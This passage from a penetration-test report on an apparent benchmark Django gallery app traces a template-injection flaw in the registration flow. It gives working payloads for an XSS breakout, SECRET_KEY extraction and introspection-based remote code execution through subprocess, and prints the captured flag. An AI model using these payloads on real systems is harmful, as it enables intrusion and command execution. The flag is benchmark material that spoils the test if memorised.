**Primary Vulnerability:** The application's most critical sink is not a traditional XSS vulnerability but a **Server-Side Template Injection (SSTI)** that can be leveraged for JavaScript execution, information disclosure, and Remote Code Execution.

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 53-55  
**Function:** `register_step3(request)`  
**Endpoint:** GET `/accounts/register/step3/`

**Vulnerable Code:**
```python
engine = engines["django"]
template_str = open('accounts/templates/accounts/register_step3.html','r').read()
template = engine.from_string(template_str.replace('ACCOUNTNAME', request.session['name']))
return HttpResponse(template.render({}, request))
```

**Injection Target in Template:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/register_step3.html`  
**Line:** 37

```html
<script>alert("Hello ACCOUNTNAME. Just Now up to 50% OFF ")</script>
```

### Render Context: JavaScript Context (Inside `<script>` Tag)

**Context Classification:** JavaScript String Literal within `<script>` block

**Sink Type:** Server-Side Template Injection allowing:
1. JavaScript Context XSS
2. Django Template Language execution
3. Python code execution via template introspection
4. Arbitrary file read
5. SECRET_KEY extraction

### Exploitation Paths

#### **Exploitation 1: JavaScript Context XSS**

**Payload:** `John"; alert(document.domain); //`

**Attack Flow:**
1. Register at `/accounts/register/step1/` with name: `John"; alert(document.domain); //`
2. Validation passes (only "%" blocked)
3. Name stored in session
4. Navigate to `/accounts/register/step3/`
5. Template becomes: `<script>alert("Hello John"; alert(document.domain); //. Just Now...")</script>`
6. JavaScript execution: First alert closes string, second alert executes, comment eliminates remaining code

**Result:** XSS execution in victim browser enabling:
- Session cookie theft (if HttpOnly not set - but it is, so limited)
- CSRF token extraction
- DOM manipulation
- Phishing attacks
- Keylogging

#### **Exploitation 2: Django Template Injection for SECRET_KEY Extraction**

**Payload:** `{{ settings.SECRET_KEY }}`

**Attack Flow:**
1. Register at `/accounts/register/step1/` with name: `{{ settings.SECRET_KEY }}`
2. Navigate to `/accounts/register/step3/`
3. Template becomes: `<script>alert("Hello {{ settings.SECRET_KEY }}. Just Now...")</script>`
4. Django template engine evaluates `{{ settings.SECRET_KEY }}`
5. Flag rendered in response: `<script>alert("Hello flag{f53780ad-f388-4624-a9a6-fe1f2b97f47e}...")</script>`

**Result:** CTF flag captured via SSTI

#### **Exploitation 3: Remote Code Execution via Object Introspection**

**Payload:** `{{"".__class__.__mro__[1].__subclasses__()[396]("cat /flag.txt",shell=True,stdout=-1).communicate()[0].strip()}}`

**Note:** Subprocess.Popen index (396) may vary by Python version.

**Attack Flow:**
1. Register with RCE payload in name field
2. Navigate to step 3
3. Django template engine executes Python code
4. Subprocess spawned with shell command `cat /flag.txt`
5. Flag content returned in HTTP response

**Result:** Arbitrary command execution on server, flag read directly from filesystem

#### **Exploitation 4: File Read via Django Template Filters**

**Payload:** `{% load static %}{{ "/flag.txt"|filesizeformat }}` or via custom template tag manipulation

**Alternative:** `{{ request.META }}` to extract environment variables

### Input Flow Tracing

**Complete Data Flow for SSTI Vulnerability:**

```
┌─────────────────────────────────────────────────────────────┐
│ Step 1: User Input                                          │
│ POST /accounts/register/step1/                              │
│ Form data: {name: "{{ settings.SECRET_KEY }}", password: "..."}│
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 2: Form Validation                                     │
│ File: forms.py, Line 6-8                                    │
│ validate_name(value)                                        │
│   if "%" in value: raise ValidationError                   │
│ Validation PASSES: "{{ settings.SECRET_KEY }}" has no "%"  │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 3: Session Storage                                     │
│ File: views.py, Line 14                                     │
│ request.session['name'] = "{{ settings.SECRET_KEY }}"      │
│ Stored in MySQL django_session table                       │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 4: Session Retrieval                                   │
│ File: views.py, Line 54                                     │
│ User navigates to GET /accounts/register/step3/            │
│ Session data retrieved: request.session['name']            │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 5: Template File Read                                  │
│ File: views.py, Line 54                                     │
│ template_str = open('accounts/templates/.../register_step3.html').read()│
│ Template contains: <script>alert("Hello ACCOUNTNAME...")</script>│
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 6: UNSAFE String Replacement (VULNERABILITY)          │
│ File: views.py, Line 55                                     │
│ template_str.replace('ACCOUNTNAME', request.session['name'])│
│ Result: <script>alert("Hello {{ settings.SECRET_KEY }}...")</script>│
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 7: Template Compilation & Execution                   │
│ File: views.py, Line 55                                     │
│ engine.from_string(modified_template_str)                   │
│ Django template engine compiles and evaluates:             │
│   {{ settings.SECRET_KEY }} → Executes Python code         │
│   Returns: "flag{f53780ad-f388-4624-a9a6-fe1f2b97f47e}"   │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 8: HTTP Response                                       │
│ File: views.py, Line 56                                     │
│ HttpResponse(template.render({}, request))                 │
│ Rendered HTML: <script>alert("Hello flag{...}...")</script>│
│ Sent to user's browser                                      │
└─────────────────────────────────────────────────────────────┘
```

### Protected Sinks (Auto-Escaping Active)

Django's auto-escaping is **ENABLED** throughout the application, providing baseline XSS protection for traditional template variable rendering. The following sinks are **NOT VULNERABLE** due to auto-escaping:

#### **Protected Sink 1: Gallery Welcome Message**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/gallery.html`  
**Line:** 44  
**Context:** HTML Body

```html
<h3 class="my-4 text-center">Welcome, {{ user.name }}!</h2>
```

**Protection:** Django auto-escaping converts HTML special characters:
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#x27;`
- `&` → `&amp;`

If user.name contains `<script>alert(1)</script>`, Django renders:
```html
Welcome, &lt;script&gt;alert(1)&lt;/script&gt;!
```

**Status:** ✓ SECURE

#### **Protected Sink 2: Preferences Username Display**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/preferences.html`  
**Line:** 37  
**Context:** HTML Body

```html
<p>Name: {{ user.username }}</p>
```

**Protection:** Auto-escaping active. Username field contains email address which is validated by EmailField, but even if malicious content bypassed validation, auto-escaping would prevent XSS.

**Status:** ✓ SECURE

#### **Protected Sink 3: Premium Status Display**

**File:** Same as above  
**Line:** 38  
**Context:** HTML Body

```html
<p>Premium Subscriber: {{ user.is_premium }}</p>
```

**Protection:** Boolean field (True/False) - no XSS risk. Auto-escaping applied anyway.

**Status:** ✓ SECURE

#### **Protected Sink 4: CSRF Token Hidden Input**

**File:** Multiple templates (login.html, register_step1.html, register_step2.html)  
**Context:** HTML Attribute (input value)

```html
<input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}">
```

**Protection:** CSRF token is cryptographically generated by Django, no user input. Auto-escaping applied to attribute context.

**Status:** ✓ SECURE

### SQL Injection Sinks - NONE DETECTED

**Finding:** All database queries use Django ORM with parameterized queries. No raw SQL, no `.raw()` calls, no cursor usage.

**Example Safe Query:**
```python
# views.py, Line 43-48
a=Account(name=request.session['name'],
        username=request.session['email'],
        email=request.session['email'],
        is_premium=is_premium)
```

Django ORM generates parameterized SQL:
```sql
INSERT INTO accounts_account (name, username, email, is_premium, password)
VALUES (%s, %s, %s, %s, %s)
-- Parameters bound separately, preventing SQL injection
```

### Command Injection Sinks - NONE IN APPLICATION CODE

**Finding:** No `os.system()`, `subprocess.call()`, `subprocess.Popen()`, `eval()`, or `exec()` calls in application code.

**Note:** The SSTI vulnerability CAN be exploited to achieve command injection via template introspection accessing subprocess module, but this is not a direct command injection sink in application code.

### URL Context Injection - NONE DETECTED

**Finding:** No user input used in `href`, `src`, `action`, or other URL attributes without sanitization. All URLs are hardcoded Django URL patterns using `{% url %}` template tag:

```html
<a href="{% url 'login' %}">Login</a>
```

Django's `{% url %}` tag generates URLs based on URL patterns, preventing injection.

### CSS Context Injection - NONE DETECTED

**Finding:** No user input injected into `style` attributes or `<style>` blocks. All CSS loaded from static files.

### Auto-Escaping Status

**Global Configuration:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 42-55

```python
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [os.path.join(BASE_DIR.parent, 'templates')],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]
```

**Auto-Escaping:** ENABLED by default (Django's default behavior, no `'autoescape': False` in OPTIONS)

**Template Tag Analysis:**
- No `{% autoescape off %}` blocks detected in any template
- No `{{ variable|safe }}` filters detected (which would bypass escaping)
- No `mark_safe()` usage in views

**Status:** Auto-escaping properly configured and active across all templates.

### Summary of XSS Attack Surface

| Sink Location | Render Context | Exploitability | Protection Status | Severity |
|---------------|----------------|----------------|-------------------|----------|
| `register_step3.html` (Line 37 via views.py:55) | JavaScript String in `<script>` | **EXPLOITABLE** | ✗ SSTI bypasses auto-escape | **CRITICAL** |
| `gallery.html` (Line 44) - `{{ user.name }}` | HTML Body | Protected | ✓ Auto-escaping | LOW |
| `preferences.html` (Line 37) - `{{ user.username }}` | HTML Body | Protected | ✓ Auto-escaping | LOW |
| `preferences.html` (Line 38) - `{{ user.is_premium }}` | HTML Body | Protected | ✓ Auto-escaping | LOW |

**Conclusion:** The application has **ONE CRITICAL SSTI vulnerability** that functions as an XSS sink in JavaScript context but provides far more severe capabilities including RCE and SECRET_KEY extraction. All traditional XSS sinks are properly protected by Django's auto-escaping. The application's XSS attack surface is limited to the SSTI vulnerability, which should be the primary focus of exploitation efforts.

---

## 10. SSRF Sinks

### Network Surface Focus Confirmation

This analysis focuses exclusively on Server-Side Request Forgery (SSRF) sinks in network-accessible web application endpoints. All analysis is limited to code reachable via HTTP requests to the deployed Django application. Local-only utilities, build scripts, developer tools, and CLI applications are excluded.

### Executive Finding: NO SSRF VULNERABILITIES DETECTED

After comprehensive analysis of all network-accessible endpoints, view functions, and third-party library usage, **NO SSRF vulnerabilities were identified** in the Django Art Gallery application. The application does not contain any mechanisms that could be exploited to make unauthorized server-side requests to internal or external resources.

### HTTP Client Library Analysis

**Finding:** ZERO HTTP client libraries present in the application.

**Dependencies Analyzed:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/requirements.txt`

```
asgiref==3.8.1          # ASGI utilities (no HTTP client functionality)
beautifulsoup4==4.12.3  # HTML parser (does NOT fetch URLs)
Django==4.2.13          # Web framework (includes HttpResponse but no client)
django-bootstrap4==24.3 # Bootstrap integration (frontend only)
django-templates==0.0.13  # Template utilities (no HTTP)
soupsieve==2.5         # CSS selector library for BeautifulSoup (no HTTP)
sqlparse==0.5.0        # SQL parser (no HTTP)
mysqlclient==2.2.4     # MySQL database driver (database protocol only)
```

**Libraries NOT Present:**
- ✗ `requests` - Most common HTTP library for Python
- ✗ `urllib`, `urllib2`, `urllib3` - Standard library HTTP clients (imported nowhere)
- ✗ `httpx` - Modern async HTTP client
- ✗ `aiohttp` - Async HTTP client/server
- ✗ `pycurl` - libcurl Python bindings
- ✗ `httplib2` - HTTP library
- ✗ `treq` - Twisted HTTP client

**Code Analysis - Import Statements:**

Searched all Python files for HTTP client imports:

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`

```python
from django.shortcuts import render, redirect
from .forms import Step1Form, Step2Form, Step3Form, LoginForm
from .models import Account
from django.contrib.auth import authenticate, login, logout
from django.http import HttpResponse
from django.template import engines
from django.contrib.auth.decorators import login_required
```

**Analysis:** Only `HttpResponse` imported, which is for SENDING responses, not making requests. No HTTP client imports.

**Other Python Files Analyzed:**
- `models.py`: Only Django model imports
- `forms.py`: Only Django forms imports
- `settings.py`: Only Django configuration imports
- `urls.py`: Only Django URL routing imports
- `admin.py`: Only Django admin imports

**Conclusion:** Application has ZERO HTTP client capability.

### URL Operations and File Fetching

**Finding:** Only TWO `open()` calls exist, both with **HARDCODED file paths** and NO user input.

**Location 1: FLAG File Read**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Line:** 11

```python
SECRET_KEY = open('/flag.txt').read()
```

**Analysis:**
- Path: Hardcoded `/flag.txt`
- User Input: NONE
- SSRF Risk: NONE (file path not user-controllable)
- Context: Application initialization, not in request handler

**Location 2: Template File Read**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Line:** 54

```python
template_str = open('accounts/templates/accounts/register_step3.html','r').read()
```

**Analysis:**
- Path: Hardcoded `accounts/templates/accounts/register_step3.html`
- User Input: NONE (path is string literal)
- SSRF Risk: NONE (no URL fetching, local file only)
- Note: This is part of the SSTI vulnerability, but not an SSRF sink

**Python Standard Library URL Functions NOT USED:**
- ✗ `urllib.request.urlopen()` - Not imported or used
- ✗ `urllib.request.urlretrieve()` - Not imported or used
- ✗ `requests.get()` / `requests.post()` - Library not installed
- ✗ `open()` with URLs - Used only with hardcoded local file paths

### Redirect and "Next URL" Handlers

**Finding:** All redirects use hardcoded Django URL patterns. No user-controlled redirect parameters.

**Redirect Analysis:**

**Location 1:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Line:** 16

```python
return redirect('register_step2')
```

**Analysis:** `'register_step2'` is a Django URL name, not a URL string. Django's `reverse()` function resolves this to `/accounts/register/step2/`. No user input.

**All Redirect Calls in Application:**
```python
redirect('register_step2')      # Line 16 - Hardcoded
redirect('register_step3')      # Line 30 - Hardcoded
redirect('register_step1')      # Line 24, 37, 57 - Hardcoded
redirect('home')                # Line 70 - Hardcoded
redirect('gallery')             # Lines 76, 99 - Hardcoded
```

**No Open Redirect Vulnerability:** All redirect targets are Django URL names resolved server-side, not user-controlled URLs.

**No "next" Parameter:** Django's `@login_required` decorator supports a `?next=/path/` parameter for redirect after login, but this application does NOT use this feature:

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 109-111

```python
LOGIN_URL = '/accounts/login/'
LOGIN_REDIRECT_URL = '/accounts/home/'
LOGOUT_REDIRECT_URL = '/accounts/login/'
```

All redirects hardcoded - no `?next=` parameter handling.

### External Service Integrations

**Finding:** ZERO external service integrations detected.

**Services NOT Present:**

**Headless Browsers:**
- ✗ Selenium WebDriver
- ✗ Playwright
- ✗ Puppeteer (Node.js, but checked for Python wrappers)
- ✗ pyppeteer

**Image/Media Processors:**
- ✗ Pillow/PIL (image library) - Not in requirements.txt
- ✗ ImageMagick / Wand
- ✗ FFmpeg
- ✗ GraphicsMagick

**OAuth/OIDC:**
- ✗ OAuth provider integrations
- ✗ OIDC discovery endpoints
- ✗ JWKS (JSON Web Key Set) fetchers
- ✗ No `django-allauth` or `python-social-auth`

**Webhook/Callback Functionality:**
- ✗ No webhook receivers
- ✗ No callback verification endpoints
- ✗ No "ping URL" functionality

**Data Import:**
- ✗ No "import from URL" features
- ✗ No CSV/JSON/XML URL loaders
- ✗ No RSS/Atom feed readers

**Monitoring/Health Checks:**
- ✗ No URL ping functionality
- ✗ No uptime monitors
- ✗ No external health check endpoints

**Email Services:**
- ✗ No SMTP configuration in settings.py
- ✗ No email sending functionality
- ✗ No email verification or password reset flows

### Database Communication Analysis

**MySQL Connection:** Internal Docker network only, not user-controllable.

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 65-74

```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME':'art_db',
        'HOST': 'db',  # Docker service name, not user-controlled
        'USER':'root',
        'PASSWORD':'art_gallery',
        'PORT':'3306'
    }
}
```

**Analysis:**
- Host: `'db'` - Hardcoded Docker service name
- Port: `'3306'` - Hardcoded
- No user input influences database connection parameters
- SSRF via database connection: NOT POSSIBLE

### Template Tags and Filters

**Finding:** No custom template tags or filters that perform external requests.

**Searched For:**
- Custom template tags in `templatetags/` directory - NOT PRESENT
- Template filters that fetch URLs - NOT FOUND
- `{% load %}` statements loading external content - NONE

**Django's Built-in URL-Related Template Tags (Not Used in This App):**
- `{% url %}` - Used, but generates internal URLs only (no SSRF)
- No custom tags extending URL functionality

### Static Files and Media Upload

**Finding:** No file upload functionality exists.

**Static Files:** Served from local filesystem, no URL-based static file fetching.

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 101-106

```python
STATIC_URL = '/static/'
STATICFILES_DIRS = [os.path.join(BASE_DIR, 'static')]
STATIC_ROOT = os.path.join(BASE_DIR, 'assets')
```

**Media Upload:**
- No `MEDIA_URL` or `MEDIA_ROOT` configured
- No `FileField` or `ImageField` in models
- No `request.FILES` processing in views
- Gallery images are pre-loaded static files, not user-uploaded

### BeautifulSoup Usage Analysis

**Dependency:** `beautifulsoup4==4.12.3` is installed.

**Searched for BeautifulSoup Usage:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`

```python
# No BeautifulSoup imports
# No 'from bs4 import' statements
# No BeautifulSoup() constructor calls
```

**Conclusion:** BeautifulSoup is installed as a dependency of another package (`django-templates==0.0.13`) but is NOT USED in application code. Even if it were used, BeautifulSoup is an HTML/XML parser, not an HTTP client - it requires pre-fetched content and cannot fetch URLs itself without an HTTP library like `requests`.

### SSRF Risk Assessment Summary

| SSRF Sink Type | Present in Application | User Input Influences | SSRF Risk |
|----------------|------------------------|----------------------|-----------|
| HTTP Client Libraries | ✗ NO | N/A | **NONE** |
| URL Openers (`urlopen`) | ✗ NO | N/A | **NONE** |
| File Fetching with URLs | ✗ NO | N/A | **NONE** |
| Redirect Handlers | ✓ YES | ✗ NO (hardcoded URL names) | **NONE** |
| Headless Browsers | ✗ NO | N/A | **NONE** |
| Image Processors | ✗ NO | N/A | **NONE** |
| OAuth/OIDC Discovery | ✗ NO | N/A | **NONE** |
| Webhook Handlers | ✗ NO | N/A | **NONE** |
| Data Import from URL | ✗ NO | N/A | **NONE** |
| Email/SMTP | ✗ NO | N/A | **NONE** |
| Database Connections | ✓ YES | ✗ NO (hardcoded config) | **NONE** |
| Template Tags Fetching URLs | ✗ NO | N/A | **NONE** |

### Conclusion

**FINAL VERDICT:** ✅ **NO SSRF VULNERABILITIES FOUND**

The Django Art Gallery application has **ZERO SSRF attack surface**. The application:
- Contains no HTTP client libraries
- Makes no external HTTP requests
- Has no URL fetching mechanisms
- Uses only hardcoded redirects
- Has no webhook or callback functionality
- Has no file upload or URL-based file fetching

**Analysis Confidence:** HIGH ✅

The application's simple architecture and minimal dependencies eliminate SSRF as a viable attack vector. Penetration testing efforts should focus on the SSTI vulnerability and other identified weaknesses rather than SSRF attack attempts.

**Recommendation for Future Development:** If external HTTP request functionality is ever added to this application, implement strict SSRF protections:
- URL allowlists (not blocklists)
- DNS resolution validation to prevent internal IP access (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
- URL scheme validation (allow only http/https)
- Request timeout limits
- Response size limits
- Network segmentation preventing application container from accessing internal networks

---

**END OF PENETRATION TEST CODE ANALYSIS REPORT**